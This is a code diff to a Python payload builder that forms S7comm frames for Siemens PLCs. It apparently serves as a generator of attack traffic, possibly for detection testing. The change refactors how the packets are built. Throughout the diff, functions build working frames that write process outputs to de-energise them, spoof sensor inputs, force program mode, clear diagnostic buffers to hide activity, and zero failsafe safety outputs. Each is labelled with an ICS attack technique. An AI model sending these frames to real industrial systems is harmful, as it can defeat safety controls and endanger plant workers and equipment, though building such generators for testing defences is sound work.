@@ -95,6 +95,15 @@ def _var_item(area: int, db_num: int, byte_addr: int, bit_addr: int = 0,
     ])
 
 
+
+def _s7_userdata_header(pdu_ref: int, param_len: int, data_len: int = 0) -> bytes:
+    """S7 header for ROSCTR_USERDATA (0x07) — 12 bytes including error word."""
+    return struct.pack(">BBHHHH BB",
+        0x32, ROSCTR_USERDATA, 0x0000, pdu_ref & 0xFFFF,
+        param_len & 0xFFFF, data_len & 0xFFFF,
+        0x00, 0x00,  # error_class=0x00, error_code=0x00 (no error)
+    )
+
 def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
     """
     Build S7comm/TPKT frame.
@@ -131,23 +140,15 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
 
     elif style == "read_var":
         addr   = int(kwargs.get("byte_addr", rnd.randint(0, 200)))
-        item   = bytes([0x12, 0x0A, 0x10, 0x02,  # spec, len, syntax, BYTE
-                        0x00, 0x01,               # count = 1
-                        0x00, 0x00,               # DB number = 0 (flags)
-                        AREA_FLAGS,               # area = Merker
-                        0x00, addr & 0xFF, 0x00]) # byte address
-        param  = bytes([FC_READ_VAR, 0x01]) + item  # FC + item count + item
+        item   = _var_item(AREA_FLAGS, 0, addr, tsize=TSIZE_BYTE)
+        param  = bytes([FC_READ_VAR, 0x01]) + item
         s7     = _s7_job_header(pdu_ref, len(param)) + param + mb
 
     elif style == "write_var":
         addr   = int(kwargs.get("byte_addr", rnd.randint(0, 200)))
         value  = int(kwargs.get("value",     rnd.randint(0, 0xFF)))
-        item   = bytes([0x12, 0x0A, 0x10, 0x02,
-                        0x00, 0x01,
-                        0x00, 0x00,
-                        AREA_OUTPUTS,
-                        0x00, addr & 0xFF, 0x00])
-        data_item = bytes([0x00, 0x04, 0x00, 0x08, value & 0xFF])  # transport + bit_len=8 + value
+        item   = _var_item(AREA_OUTPUTS, 0, addr, tsize=TSIZE_BYTE)
+        data_item = bytes([0x00, 0x04, 0x00, 0x08, value & 0xFF])
         param  = bytes([FC_WRITE_VAR, 0x01]) + item
         s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb
 
@@ -204,20 +205,15 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
 
     elif style == "szl_read":
         # SZL/SSL read via ROSCTR_USERDATA — T0868/T0882
-        # Subfunction = 0x44 (SSL list), SZL-ID 0x0011 (component info)
+        # Subfunction = 0x44 (read SZL), SZL-ID 0x0011 (component info)
+        # USERDATA param block: method(1)+type(1)+subfunction(1)+seq(1) = 4 bytes
+        # Then SZL data: szl_id(2)+szl_idx(2)
         szl_id  = int(kwargs.get("szl_id", 0x0011)) & 0xFFFF
         szl_idx = int(kwargs.get("szl_idx", 0x0000)) & 0xFFFF
-        param   = struct.pack(">BBBBBBBBHbb",
-            0x00, 0x01,  # prot class, func
-            0x12,        # parameter head
-            0x08, 0x12, 0x84, 0x01, 0x01,  # parameter type: SZL-ID type
-            szl_id, 0x00, 0x01)
-        # Simplified: just use known USERDATA pattern
+        # USERDATA function parameter: class=0x11 (CPU func), fn=0x44 (SZL read), seq=0x01, reserved=0x00
         param2  = bytes([0x00, 0x01, 0x12, 0x04, 0x11, 0x44, 0x01, 0x00])
         szl_req = struct.pack(">HH", szl_id, szl_idx)
-        s7      = struct.pack(">BBHHHH",
-            0x32, ROSCTR_USERDATA, 0x0000, pdu_ref & 0xFFFF,
-            len(param2), len(szl_req)) + param2 + szl_req + mb
+        s7      = _s7_userdata_header(pdu_ref, len(param2), len(szl_req)) + param2 + szl_req + mb
 
     elif style == "plc_control":
         # Generic PLC control (ROSCTR=JOB, FC=0x28) — T0875 Change Program State
@@ -232,11 +228,7 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
         # Read from Data Block — T0882 systematic extraction
         db_num = int(kwargs.get("db_num",   rnd.randint(1, 50))) & 0xFFFF
         byte_a = int(kwargs.get("byte_addr",rnd.randint(0, 200)))
-        item   = bytes([0x12, 0x0A, 0x10, 0x04,  # WORD
-                        0x00, 0x01,
-                        (db_num >> 8) & 0xFF, db_num & 0xFF,
-                        AREA_DB,
-                        0x00, byte_a & 0xFF, 0x00])
+        item   = _var_item(AREA_DB, db_num, byte_a, tsize=TSIZE_WORD)
         param  = bytes([FC_READ_VAR, 0x01]) + item
         s7     = _s7_job_header(pdu_ref, len(param)) + param + mb
 
@@ -245,11 +237,7 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
         db_num = int(kwargs.get("db_num",   rnd.randint(1, 50))) & 0xFFFF
         byte_a = int(kwargs.get("byte_addr",rnd.randint(0, 200)))
         value  = int(kwargs.get("value",    rnd.randint(0, 0xFFFF))) & 0xFFFF
-        item   = bytes([0x12, 0x0A, 0x10, 0x04,
-                        0x00, 0x01,
-                        (db_num >> 8) & 0xFF, db_num & 0xFF,
-                        AREA_DB,
-                        0x00, byte_a & 0xFF, 0x00])
+        item   = _var_item(AREA_DB, db_num, byte_a, tsize=TSIZE_WORD)
         data_item = struct.pack(">BBHH", 0x00, 0x04, 0x00, 0x10) + struct.pack(">H", value)
         param  = bytes([FC_WRITE_VAR, 0x01]) + item
         s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb
@@ -258,23 +246,15 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
         # Read process outputs — T0801 output monitoring
         qty    = int(kwargs.get("quantity", rnd.randint(1, 8)))
         byte_a = int(kwargs.get("byte_addr", 0))
-        item   = bytes([0x12, 0x0A, 0x10, 0x02,
-                        0x00, qty & 0xFF,
-                        0x00, 0x00,
-                        AREA_OUTPUTS,
-                        0x00, byte_a & 0xFF, 0x00])
+        item   = _var_item(AREA_OUTPUTS, 0, byte_a, length=qty, tsize=TSIZE_BYTE)
         param  = bytes([FC_READ_VAR, 0x01]) + item
         s7     = _s7_job_header(pdu_ref, len(param)) + param + mb
 
     elif style == "write_outputs":
         # Write to process outputs — T0876 Loss of Safety
         byte_a = int(kwargs.get("byte_addr", rnd.randint(0, 64)))
-        value  = int(kwargs.get("value",     0x00)) & 0xFF  # zero = de-energise
-        item   = bytes([0x12, 0x0A, 0x10, 0x02,
-                        0x00, 0x01,
-                        0x00, 0x00,
-                        AREA_OUTPUTS,
-                        0x00, byte_a & 0xFF, 0x00])
+        value  = int(kwargs.get("value",     0x00)) & 0xFF
+        item   = _var_item(AREA_OUTPUTS, 0, byte_a, tsize=TSIZE_BYTE)
         data_item = bytes([0x00, 0x04, 0x00, 0x08, value])
         param  = bytes([FC_WRITE_VAR, 0x01]) + item
         s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb
@@ -283,11 +263,7 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
         # Read AREA_INPUTS (process input image) — T0877 I/O Image
         qty    = int(kwargs.get("quantity", rnd.randint(4, 16)))
         byte_a = int(kwargs.get("byte_addr", 0))
-        item   = bytes([0x12, 0x0A, 0x10, 0x02,
-                        0x00, qty & 0xFF,
-                        0x00, 0x00,
-                        AREA_INPUTS,
-                        0x00, byte_a & 0xFF, 0x00])
+        item   = _var_item(AREA_INPUTS, 0, byte_a, length=qty, tsize=TSIZE_BYTE)
         param  = bytes([FC_READ_VAR, 0x01]) + item
         s7     = _s7_job_header(pdu_ref, len(param)) + param + mb
 
@@ -296,11 +272,7 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
         # Attacker forces PLC to see false sensor values
         byte_a = int(kwargs.get("byte_addr", rnd.randint(0, 32)))
         value  = int(kwargs.get("value", rnd.randint(0, 0xFF))) & 0xFF
-        item   = bytes([0x12, 0x0A, 0x10, 0x02,
-                        0x00, 0x01,
-                        0x00, 0x00,
-                        AREA_INPUTS,
-                        0x00, byte_a & 0xFF, 0x00])
+        item   = _var_item(AREA_INPUTS, 0, byte_a, tsize=TSIZE_BYTE)
         data_item = bytes([0x00, 0x04, 0x00, 0x08, value])
         param  = bytes([FC_WRITE_VAR, 0x01]) + item
         s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb
@@ -342,12 +314,10 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
 
     elif style == "szl_clear":
         # SZL USERDATA request to clear diagnostic buffer — T0872 Indicator Removal on Host
-        # Subfunction 0x0F11 = clear diagnostic buffer
+        # Subfunction 0x4F = clear diag buffer, class=0x11
         param2  = bytes([0x00, 0x01, 0x12, 0x04, 0x11, 0x4F, 0x01, 0x00])  # clear subfunction
         szl_req = struct.pack(">HH", 0x0F11, 0x0000)
-        s7      = struct.pack(">BBHHHH",
-            0x32, ROSCTR_USERDATA, 0x0000, pdu_ref & 0xFFFF,
-            len(param2), len(szl_req)) + param2 + szl_req + mb
+        s7      = _s7_userdata_header(pdu_ref, len(param2), len(szl_req)) + param2 + szl_req + mb
 
     elif style == "program_mode":
         # Set PLC to PROGRAM mode (allows ladder logic writes) — T0858 Change Operating Mode
@@ -361,11 +331,7 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
         # Write to F-CPU (failsafe) output area — T0880 Loss of Safety
         # F-CPUs (315F, 317F) have safety-rated outputs at area 0x82 with F-module addressing
         byte_a = int(kwargs.get("byte_addr", rnd.randint(0, 16)))
-        item   = bytes([0x12, 0x0A, 0x10, 0x02,
-                        0x00, 0x04,            # 4 bytes = one F-output word
-                        0x00, 0x00,
-                        AREA_OUTPUTS,
-                        0x00, byte_a & 0xFF, 0x00])
+        item   = _var_item(AREA_OUTPUTS, 0, byte_a, length=4, tsize=TSIZE_BYTE)
         data_item = bytes([0x00, 0x04, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00])  # all zeros
         param  = bytes([FC_WRITE_VAR, 0x01]) + item
         s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb
@@ -400,11 +366,7 @@ def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
     elif style == "read_all_dbs":
         # Systematically read multiple DB blocks — T0811/T0893 Data from Local System
         db_num = int(kwargs.get("db_num", rnd.randint(1, 100))) & 0xFFFF
-        item   = bytes([0x12, 0x0A, 0x10, 0x04,
-                        0x00, 0x7E,            # max 126 words
-                        (db_num >> 8) & 0xFF, db_num & 0xFF,
-                        AREA_DB,
-                        0x00, 0x00, 0x00])
+        item   = _var_item(AREA_DB, db_num, 0, length=126, tsize=TSIZE_WORD)
         param  = bytes([FC_READ_VAR, 0x01]) + item
         s7     = _s7_job_header(pdu_ref, len(param)) + param + mb
 
